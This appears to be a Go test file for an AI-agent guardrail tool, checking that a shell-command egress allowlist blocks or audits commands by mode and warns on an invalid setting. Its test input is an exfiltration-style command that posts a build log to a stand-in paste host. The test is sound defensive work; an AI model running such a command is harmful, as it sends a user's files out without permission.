package assembly

import (
	"bytes"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/AI-AgentLens/agentshield/internal/analyzer"
	"github.com/AI-AgentLens/agentshield/internal/policy"
)

func loadUserPolicy(t *testing.T, body string) *policy.Policy {
	t.Helper()
	path := filepath.Join(t.TempDir(), "policy.yaml")
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	p, err := policy.Load(path)
	if err != nil {
		t.Fatalf("load: %v", err)
	}
	return p
}

// #4437: the allowlist's BLOCK goes through the same mode machinery as every
// other BLOCK — nothing special-cases it. Audit-only records it as a
// would-block AUDIT carrying the rule; enforce blocks.
func TestShellEngine_EgressAllowlistFollowsMode(t *testing.T) {
	clearCIEnv(t)
	const body = "network:\n  enforce_allowlist: true\n  allow_domains: [github.com]\n"
	const cmd = "curl -s -X POST -d @build-log.txt https://paste.example/api"
	for _, c := range []struct {
		mode         string
		want, wantOr policy.Decision
	}{
		{"enforce", policy.DecisionBlock, ""},
		{"", policy.DecisionBlock, ""},
		{"audit-only", policy.DecisionAudit, policy.DecisionBlock},
	} {
		engine, err := ShellEngine(loadUserPolicy(t, body), 0, c.mode)
		if err != nil {
			t.Fatal(err)
		}
		got := engine.Evaluate(cmd, nil)
		if got.Decision != c.want || got.OriginalDecision != c.wantOr {
			t.Errorf("mode %q: %s (original %q), want %s (original %q)", c.mode, got.Decision, got.OriginalDecision, c.want, c.wantOr)
		}
		if !slices.Contains(got.TriggeredRules, analyzer.EgressAllowlistRuleID) {
			t.Errorf("mode %q: rule %s missing from %q", c.mode, analyzer.EgressAllowlistRuleID, got.TriggeredRules)
		}
		if !slices.Contains(got.TaxonomyRefs, analyzer.EgressAllowlistTaxonomy) {
			t.Errorf("mode %q: taxonomy %s missing from %q", c.mode, analyzer.EgressAllowlistTaxonomy, got.TaxonomyRefs)
		}
	}
}

// An invalid switch value must not fail engine construction (that would make
// every command an eval-error AUDIT, or a BLOCK under fail_closed). It is
// reported where every live surface builds its engine, and enforcement stays
// off.
func TestShellEngine_ReportsInvalidEgressSwitch(t *testing.T) {
	clearCIEnv(t)
	var buf bytes.Buffer
	prev := configWarnings
	configWarnings = &buf
	t.Cleanup(func() { configWarnings = prev })

	engine, err := ShellEngine(loadUserPolicy(t, "network:\n  enforce_allowlist: yes\n  allow_domains: [github.com]\n"), 0, "enforce")
	if err != nil {
		t.Fatalf("invalid switch failed engine construction: %v", err)
	}
	out := buf.String()
	if !strings.Contains(out, "[AgentShield] warning: network.enforce_allowlist") || !strings.Contains(out, "OFF") {
		t.Errorf("warning not reported: %q", out)
	}
	if got := engine.Evaluate("curl -s https://paste.example/api", nil); slices.Contains(got.TriggeredRules, analyzer.EgressAllowlistRuleID) {
		t.Errorf("allowlist enforced despite the invalid switch: %+v", got)
	}

	buf.Reset()
	if _, err := ShellEngine(loadUserPolicy(t, "network:\n  enforce_allowlist: true\n  allow_domains: [github.com]\n"), 0, "enforce"); err != nil {
		t.Fatal(err)
	}
	if buf.Len() != 0 {
		t.Errorf("valid policy produced warnings: %q", buf.String())
	}
}
